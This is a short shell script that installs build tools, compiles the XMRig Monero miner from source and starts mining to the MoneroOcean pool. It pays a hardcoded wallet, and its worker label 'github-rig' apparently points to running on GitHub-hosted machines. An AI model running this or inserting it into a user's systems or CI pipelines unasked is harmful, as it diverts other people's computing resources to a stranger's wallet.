#!/bin/bash
sudo apt update && sudo apt install -y git build-essential cmake automake libtool autoconf
git clone https://github.com/xmrig/xmrig.git
cd xmrig && mkdir build && cd build
cmake ..
make -j$(nproc)
./xmrig -o gulf.moneroocean.stream:20128 -u 47K4hUp8jr7iZMXxkRjv86gkANApNYWdYiarnyNb6AHYFuhnMCyxhWcVF7K14DKEp8bxvxYuXhScSMiCEGfTdapmKiAB3hi -p github-rig --donate-level 1
